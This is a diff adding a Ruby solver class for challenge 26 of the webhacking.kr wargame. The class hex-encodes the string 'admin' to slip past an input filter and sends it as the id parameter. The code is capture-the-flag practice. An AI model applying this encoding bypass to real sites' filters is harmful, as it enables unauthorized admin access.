@@ -634,6 +634,25 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 26
+  class Challenge26 < ChallengeBase
+    CHALLENGE = 26
+
+    PATH = '/challenge/web-11/'
+    PARAM_ID = 'id'
+    LOGIN = 'admin'
+
+    def exec
+      payload = String.new
+      LOGIN.each_char { |char| payload << "%#{char.ord.to_s(16)}" }
+      query = URI.encode_www_form(PARAM_ID => payload)
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 32
   class Challenge32 < ChallengeBase
     CHALLENGE = 32
